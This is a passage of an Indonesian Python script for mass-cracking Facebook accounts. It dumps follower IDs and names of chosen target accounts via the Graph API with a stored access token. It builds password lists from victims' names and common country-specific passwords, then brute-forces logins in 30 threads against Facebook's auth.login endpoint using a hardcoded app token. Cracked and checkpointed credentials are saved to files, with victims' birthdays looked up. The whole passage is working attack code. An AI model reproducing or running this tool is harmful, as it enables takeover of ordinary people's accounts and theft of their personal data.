                                        jalan(war+"Maaf Masalah Tidak DiKetahui")
                                        jalan(war+"Maaf Masalah Terhadap Id 05")
                                        input(war+"Press Enter !!")
                                        menu()
                                except KeyError:
                                    print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
                                    print((k+"\n[ "+p+"Back"+k+" ]"+p))
                                    public()
                            except Exception as e: 
                                jalan(war+"Maaf Masalah Tidak DiKetahui")
                                jalan(war+"Maaf Masalah Terhadap Id 04")
                                input(war+"Press Enter !!")
                                menu()
                        except KeyError:
                            print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
                            print((k+"\n[ "+p+"Back"+k+" ]"+p))
                            public()
                    except Exception as e: 
                        jalan(war+"Maaf Masalah Tidak DiKetahui")
                        jalan(war+"Maaf Masalah Terhadap Id 03")
                        input(war+"Press Enter !!")
                        menu()
                except KeyError:
                    print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
                    print((k+"\n[ "+p+"Back"+k+" ]"+p))
                    public()
            except Exception as e: 
                jalan(war+"Maaf Masalah Tidak DiKetahui")
                jalan(war+"Maaf Masalah Terhadap Id 02")
                input(war+"Press Enter !!")
                menu()
        except KeyError:
            print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
            print((k+"\n[ "+p+"Back"+k+" ]"+p))
            public()
    except Exception as e: 
        jalan(war+"Maaf Masalah Tidak DiKetahui")
        jalan(war+"Maaf Masalah Terhadap Id 01")
        input(war+"Press Enter !!")
        menu()

def Follow__02():
	jalan(war+"Made by Risky And Dumai-991")
	idt = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 01 : ")
	while len(idt) < 7:
		jalan("Kosong ??" if idt in (""," ") else (war+"Masukan 7 Angka !!"))
		time.sleep(1.75)
		Follow__02()
	idt2 = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 02 : ")
	while len(idt2) < 7:
		jalan("Kosong ??" if idt in (""," ") else (war+"Masukan 7 Angka !!"))
		time.sleep(1.75)
		Follow__02()
	jalan(k+"["+p+"•"+k+"]"+p+" Recommended For 1500 Dump ID")
	max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
	while len(max_id) < 3:
		jalan("Kosong ??" if idt in (""," ") else (war+"Masukan 7 Angka !!"))
		time.sleep(1.75)
		max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
	try:
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
			print((k+"\n[ "+p+"Back"+k+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt2+"/subscribers?limit="+max_id+"&access_token="+toket)
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "a+")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
		try:
			try:
				jok = requests.get("https://graph.facebook.com/"+idt2+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
			except KeyError:
				print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
				print((k+"\n[ "+p+"Back"+k+" ]"+p))
				publik()
				r=requests.get("https://graph.facebook.com/"+idt2+"/subscribers?limit="+max_id+"&access_token="+toket)
			z=json.loads(r.text)
			ys = open(qq , "a+")#.replace(" ","_")
			for a in z["data"]:
				id.append(a["id"]+"<=>"+a["name"])
				ys.write(a["id"]+"<=>"+a["name"]+"\n")
			ys.close()
			print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
			return pilihcrack(qq)
		except Exception as e:
			jalan(war+"Maaf Masalah Tidak DiKetahui")
			jalan(war+"Maaf Masalah Terhadap Id 02")
			input(war+"Press Enter !!")
			menu()
	except Exception as e: 
		jalan(war+"Maaf Masalah Tidak DiKetahui")
		jalan(war+"Maaf Masalah Terhadap Id 01")
		input(war+"Press Enter !!")
		menu()
def Follow__03():
	jalan(war+"Made by Risky And Dumai-991")
	idt = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 01 : ")
	while len(idt) < 7:
		jalan("Kosong ??" if idt in (""," ") else (war+"Masukan 7 Angka !!"))
		time.sleep(1.75)
		Follow__03()
	idt2 = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 02 : ")
	while len(idt2) < 7:
		jalan("Kosong ??" if idt2 in (""," ") else (war+"Masukan 7 Angka !!"))
		time.sleep(1.75)
		Follow__03()
	idt3 = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 03 : ")
	while len(idt3) < 7:
		jalan("Kosong ??" if idt3 in (""," ") else (war+"Masukan 7 Angka !!"))
		time.sleep(1.75)
		Follow__03()
	jalan(k+"["+p+"•"+k+"]"+p+" Recommended For 1500 Dump ID")
	max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
	while len(max_id) < 3:
		jalan("Kosong ??" if max_id in (""," ") else (war+"Masukan 3 Angka !!"))
		time.sleep(1.75)
		max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		print(k+"["+p+"!"+k+"]"+p+" Cookie/Token Rusak")
		os.system("rm -rf login.txt")
		logs()
	try:
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
			print((k+"\n[ "+p+"Back"+k+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+max_id+"&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		try:
			try:
				jok = requests.get("https://graph.facebook.com/"+idt2+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
			except KeyError:
				print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
				print((k+"\n[ "+p+"Back"+k+" ]"+p))
				publik()
				r=requests.get("https://graph.facebook.com/"+idt2+"/subscribers?limit="+max_id+"&access_token="+toket)
			z=json.loads(r.text)
			ys = open(qq , "a+")#.replace(" ","_")
			for a in z["data"]:
				id.append(a["id"]+"<=>"+a["name"])
				ys.write(a["id"]+"<=>"+a["name"]+"\n")
			ys.close()
			try:
				try:
					jok = requests.get("https://graph.facebook.com/"+idt3+"?access_token="+toket)
					op = json.loads(jok.text)
					print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
				except KeyError:
					print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
					print((k+"\n[ "+p+"Back"+k+" ]"+p))
					publik()
					r=requests.get("https://graph.facebook.com/"+idt3+"/subscribers?limit="+max_id+"&access_token="+toket)
				z=json.loads(r.text)
				ys = open(qq , "a+")#.replace(" ","_")
				for a in z["data"]:
					id.append(a["id"]+"<=>"+a["name"])
					ys.write(a["id"]+"<=>"+a["name"]+"\n")
				ys.close()
				print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
				return pilihcrack(qq)
			except Exception as e:
				jalan(war+"Maaf Masalah Tidak DiKetahui")
				jalan(war+"Maaf Masalah Terhadap Id 03")
				input(war+"Press Enter !!")
				menu()
		except Exception as e:
			jalan(war+"Maaf Masalah Tidak DiKetahui")
			jalan(war+"Maaf Masalah Terhadap Id 02")
			input(war+"Press Enter !!")
			menu()
	except Exception as e: 
		jalan(war+"Maaf Masalah Tidak DiKetahui")
		jalan(war+"Maaf Masalah Terhadap Id 01")
		input(war+"Press Enter !!")
		menu()
def Khusus():
	jalan("Made by Risky And Dumai-991")
	print(f"{war}Ketik ( menu ) Untuk Kembali KeMenu Utaman")
	idt = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 01 : ")
	while len(idt) < 7:
		jalan("Kosong ??" if idt in (""," ") else (war+"Masukan 7 Angka !!"))
		time.sleep(1.75)
		Khusus()
	idt2 = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 02 : ")
	while len(idt2) < 7:
		jalan("Kosong ??" if idt2 in (""," ") else (war+"Masukan 7 Angka !!"))
		time.sleep(1.75)
		Khusus()
	idt3 = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 03 : ")
	while len(idt3) < 7:
		jalan("Kosong ??" if idt3 in (""," ") else (war+"Masukan 7 Angka !!"))
		time.sleep(1.75)
		Khusus()
	idt4 = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 04 : ")
	while len(idt4) < 7:
		jalan("Kosong ??" if idt4 in (""," ") else (war+"Masukan 7 Angka !!"))
		time.sleep(1.75)
		Khusus()
	idt5 = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 05 : ")
	while len(idt5) < 7:
		jalan("Kosong ??" if idt5 in (""," ") else (war+"Masukan 7 Angka !!"))
		time.sleep(1.75)
		Khusus()
	jalan(k+"["+p+"•"+k+"]"+p+" Recommended For 1500 Dump ID")
	max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
	while len(max_id) < 3:
		jalan("Kosong ??" if max_id in (""," ") else (war+"Masukan 3 Angka !!"))
		time.sleep(1.75)
		max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		print(k+"["+p+"!"+k+"]"+p+" Cookie/Token Rusak")
		os.system("rm -rf login.txt")
		logs()
	try:
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
			print((k+"\n[ "+p+"Back"+k+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+max_id+"&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		try:
			try:
				jok = requests.get("https://graph.facebook.com/"+idt2+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
			except KeyError:
				print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
			r=requests.get("https://graph.facebook.com/"+idt2+"/subscribers?limit="+max_id+"&access_token="+toket)
			z=json.loads(r.text)
			ys = open(qq , "a+")#.replace(" ","_")
			for a in z["data"]:
				id.append(a["id"]+"<=>"+a["name"])
				ys.write(a["id"]+"<=>"+a["name"]+"\n")
			ys.close()
			try:
				try:
					jok = requests.get("https://graph.facebook.com/"+idt3+"?access_token="+toket)
					op = json.loads(jok.text)
					print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
				except KeyError:
					print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
				r=requests.get("https://graph.facebook.com/"+idt3+"/subscribers?limit="+max_id+"&access_token="+toket)
				z=json.loads(r.text)
				ys = open(qq , "a+")#.replace(" ","_")
				for a in z["data"]:
					id.append(a["id"]+"<=>"+a["name"])
					ys.write(a["id"]+"<=>"+a["name"]+"\n")
				ys.close()
				try:
					try:
						jok = requests.get("https://graph.facebook.com/"+idt4+"?access_token="+toket)
						op = json.loads(jok.text)
						print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
					except KeyError:
						print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
					r=requests.get("https://graph.facebook.com/"+idt4+"/subscribers?limit="+max_id+"&access_token="+toket)
					z=json.loads(r.text)
					ys = open(qq , "a+")#.replace(" ","_")
					for a in z["data"]:
						id.append(a["id"]+"<=>"+a["name"])
						ys.write(a["id"]+"<=>"+a["name"]+"\n")
					ys.close()
					try:
						try:
							jok = requests.get("https://graph.facebook.com/"+idt5+"?access_token="+toket)
							op = json.loads(jok.text)
							print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
						except KeyError:
							print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
						r=requests.get("https://graph.facebook.com/"+idt5+"/subscribers?limit="+max_id+"&access_token="+toket)
						z=json.loads(r.text)
						ys = open(qq , "a+")#.replace(" ","_")
						for a in z["data"]:
							id.append(a["id"]+"<=>"+a["name"])
							ys.write(a["id"]+"<=>"+a["name"]+"\n")
						ys.close()
						print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
						return pilihcrack(qq)
					except Exception as e:
						jalan(war+"Maaf Masalah Tidak DiKetahui")
						jalan(war+"Maaf Masalah Terhadap Id 05")
						input(war+"Press Enter !!")
						menu()
				except Exception as e:
					jalan(war+"Maaf Masalah Tidak DiKetahui")
					jalan(war+"Maaf Masalah Terhadap Id 04")
					input(war+"Press Enter !!")
					menu()
			except Exception as e:
				jalan(war+"Maaf Masalah Tidak DiKetahui")
				jalan(war+"Maaf Masalah Terhadap Id 03")
				input(war+"Press Enter !!")
				menu()
		except Exception as e:
			jalan(war+"Maaf Masalah Tidak DiKetahui")
			jalan(war+"Maaf Masalah Terhadap Id 02")
			input(war+"Press Enter !!")
			menu()
	except Exception as e:
		jalan(war+"Maaf Masalah Tidak DiKetahui")
		jalan(war+"Maaf Masalah Terhadap Id 01")
		input(war+"Press Enter !!")
		menu()
def Follow__04():
	jalan(war+"Made by Risky And Dumai-991")
	print(f"{war}Ketik ( menu ) Untuk Kembali KeMenu Utaman")
	idt = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 01 : ")
	while len(idt) < 7:
		jalan("Kosong ??" if idt in (""," ") else (war+"Masukan 7 Angka !!"))
		time.sleep(1.75)
		Khusus()
	idt2 = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 02 : ")
	while len(idt2) < 7:
		jalan("Kosong ??" if idt2 in (""," ") else (war+"Masukan 7 Angka !!"))
		time.sleep(1.75)
		Khusus()
	idt3 = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 03 : ")
	while len(idt3) < 7:
		jalan("Kosong ??" if idt3 in (""," ") else (war+"Masukan 7 Angka !!"))
		time.sleep(1.75)
		Khusus()
	idt4 = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 04 : ")
	while len(idt4) < 7:
		jalan("Kosong ??" if idt4 in (""," ") else (war+"Masukan 7 Angka !!"))
		time.sleep(1.75)
		Khusus()
	jalan(k+"["+p+"•"+k+"]"+p+" Recommended For 1500 Dump ID")
	max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
	while len(max_id) < 3:
		jalan("Kosong ??" if max_id in (""," ") else (war+"Masukan 3 Angka !!"))
		time.sleep(1.75)
		max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		print(k+"["+p+"!"+k+"]"+p+" Cookie/Token Rusak")
		os.system("rm -rf login.txt")
		logs()
	try:
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
			print((k+"\n[ "+p+"Back"+k+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+max_id+"&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		try:
			try:
				jok = requests.get("https://graph.facebook.com/"+idt2+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
			except KeyError:
				print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
			r=requests.get("https://graph.facebook.com/"+idt2+"/subscribers?limit="+max_id+"&access_token="+toket)
			z=json.loads(r.text)
			ys = open(qq , "a+")#.replace(" ","_")
			for a in z["data"]:
				id.append(a["id"]+"<=>"+a["name"])
				ys.write(a["id"]+"<=>"+a["name"]+"\n")
			ys.close()
			try:
				try:
					jok = requests.get("https://graph.facebook.com/"+idt3+"?access_token="+toket)
					op = json.loads(jok.text)
					print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
				except KeyError:
					print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
				r=requests.get("https://graph.facebook.com/"+idt3+"/subscribers?limit="+max_id+"&access_token="+toket)
				z=json.loads(r.text)
				ys = open(qq , "a+")#.replace(" ","_")
				for a in z["data"]:
					id.append(a["id"]+"<=>"+a["name"])
					ys.write(a["id"]+"<=>"+a["name"]+"\n")
				ys.close()
				try:
					try:
						jok = requests.get("https://graph.facebook.com/"+idt4+"?access_token="+toket)
						op = json.loads(jok.text)
						print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
					except KeyError:
						print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
					r=requests.get("https://graph.facebook.com/"+idt4+"/subscribers?limit="+max_id+"&access_token="+toket)
					z=json.loads(r.text)
					ys = open(qq , "a+")#.replace(" ","_")
					for a in z["data"]:
						id.append(a["id"]+"<=>"+a["name"])
						ys.write(a["id"]+"<=>"+a["name"]+"\n")
					ys.close()
					print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
					return pilihcrack(qq)
				except Exception as e:
					jalan(war+"Maaf Masalah Tidak DiKetahui")
					jalan(war+"Maaf Masalah Terhadap Id 04")
					input(war+"Press Enter !!")
					menu()
			except Exception as e:
				jalan(war+"Maaf Masalah Tidak DiKetahui")
				jalan(war+"Maaf Masalah Terhadap Id 03")
				input(war+"Press Enter !!")
				menu()
		except Exception as e:
			jalan(war+"Maaf Masalah Tidak DiKetahui")
			jalan(war+"Maaf Masalah Terhadap Id 02")
			input(war+"Press Enter !!")
			menu()
	except Exception as e:
		jalan(war+"Maaf Masalah Tidak DiKetahui")
		jalan(war+"Maaf Masalah Terhadap Id 01")
		input(war+"Press Enter !!")
		menu()
def Follow__01():
	idt = input(k+"["+p+"•"+k+"]"+p+" Followers ID Target 01 : ")
	while len(idt) < 7:
		jalan("Kosong ??" if idt in (""," ") else (war+"Masukan 7 Angka !!"))
		time.sleep(1.75)
		Follow__01()
	jalan(k+"["+p+"•"+k+"]"+p+" Recommended For 1500 Dump ID")
	max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
	while len(max_id) < 3:
		jalan("Kosong ??" if max_id in (""," ") else (war+"Wajib 3 Angka !!"))
		time.sleep(1.75)
		max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		print(k+"["+p+"!"+k+"]"+p+" Cookie/Token Rusak")
		os.system("rm -rf login.txt")
		logs()
	try:
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
			print((k+"\n[ "+p+"Back"+k+" ]"+p))
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+max_id+"&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e: 
		jalan(war+"Maaf Masalah Tidak DiKetahui")
		jalan(war+"Maaf Masalah Terhadap Id 01")
		input(war+"Press Enter !!")
		menu()

def pilihcrack(file):
  print((k+"\n["+p+"1"+k+"]"+p+" Api "+k+"("+i+" SPAM CRACK 57% "+k+")"))
  print((k+"["+p+"2"+k+"]"+p+" Mbasic "+k+"("+i+" SPAM CRACK 10% "+k+")"))
  print((k+"["+p+"3"+k+"]"+p+" Api + Ttl "+k+"("+i+" SPAM CRACK 43% "+k+")"))
#  print((k+"["+p+"3"+k+"]"+p+" Mbasic + Tll"))
  print((k+"["+p+"4"+k+"]"+p+" Free Facebook "+k+"("+i+" SPAM CRACK 0%"+k+")"))
  krah=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
  if krah in[""]:
    print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
    pilihcrack(file)
  elif krah in["1","01"]:
    bapi(file)
  elif krah in["2","02"]:
    crack(file)
  elif krah in["3","03"]:
    ppx=open(".pass.txt", "w")
    ppx.write("lpp")
    ppx.close()
    bapittl(file)
  elif krah in["4","04"]:
    crackffb(file)
  else:
    print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
    pilihcrack(file)
def generate(text):
	results=[]
	ct = open('.pass.txt', 'r').read()
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
			else:
				results.append(i)
				if "id" in ct:
					results.append("sayang")
					results.append("bismillah")
					results.append("anjing")
					results.append("kontol")
					results.append("indonesia")
					results.append("bajingan")
					results.append("123456")
				elif "bd" in ct:
					results.append("786786")
					results.append("000786")
					results.append("102030")
					results.append("556677")
				elif "pk" in ct:
					results.append("pakistan")
					results.append("786786")
					results.append("000786")
				elif "us" in ct:
					results.append("123456")
					results.append("qwerty")
					results.append("iloveyou")
					results.append("passwords")
				elif "lpp" in ct:
					results.append("sayang")
				elif "all" in ct:
					results.append("kontol")
					results.append("bajingan")
					results.append("sayang")
					results.append("indonesia")
					results.append("123456")
					results.append("bangsat")
					results.append("katasandi")
				elif "v1" in ct:
					results.append("sayang")
	return results
def kata_risky():
    ngr = open('.pass.txt', 'r').read()
    if "id" in ngr:
        negara = "Indonesia"
        dumai = "name123,name1234,name12345,name321,name4321,sayang,bismillah,anjing,kontol,indonesia,bajingan,123456"
    elif "bd" in ngr:
        negara = "Bangladesh/India"
        dumai = "102030,556677,000786,786786"
    elif "pk" in ngr:
        negara = "Pakistan"
        dumai = "000786,786786,pakistan"
    elif "us" in ngr:
        negara = "USA"
        dumai = "passwords,qwerty,iloveyou,123456"
    elif "lpp" in ngr:
        negara = "Indonesia + TTL"
        dumai = "name123,name1234,name12345,name321"
    print(war+"You Are Using A Password From The Country "+k+negara)
    print(war+"Password Now Used : "+k+dumai)
class bapittl:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    kata_risky()
    print(("\n"+k+"["+p+"•"+k+"]"+p+" Do You Want To Use Manual Password?? "+k+"[ "+h+"Y/n"+k+" ]"+p))
    while True:
      f=input(k+"["+p+"•"+k+"]"+p+" Dumai-991 : ")
      if f in[""," "]:
        print((k+"["+p+"!"+k+"]"+p+" Invalid Number"))
        continue
      elif f in["y","Y"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["n","N"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + "|" + password)
      print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s|%s %s               "%(username,password,N)))
      ok.append(username + "|" + password)
      save = open("Hasil/OK-"+durasi+".txt", "a")
      save.write(str(username) + "|" + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        try:
          ke=requests.get("https://graph.facebook.com/"+str(username)+"?access_token="+open("login.txt","r").read())
          tt=json.loads(ke.text)
          ttl=tt["birthday"]
        except:pass
        self.cp.append(username + "|" + password + "|" + ttl)
        print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s|%s|%s\x1b[0m   "%(username,password,ttl)))
        save = open("CP-"+durasi+".txt", "a+")
        save.write(str(username) + "|" + str(password) + "|"+ str(ttl)+"\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
class bapi:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    kata_risky()
    print(("\n"+k+"["+p+"•"+k+"]"+p+" Do You Want To Use Manual Password?? "+k+"[ "+h+"Y/n"+k+" ]"+p))
    while True:
      f=input(k+"["+p+"•"+k+"]"+p+" Dumai-991 ?: ")
      if f in[""," "]:
        print((k+"["+p+"!"+k+"]"+p+" Invalid Number"))
        continue
      elif f in["y","Y"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : Hasil/OK-"+durasi+".txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : Hasil/CP-"+durasi+".txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["n","N"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
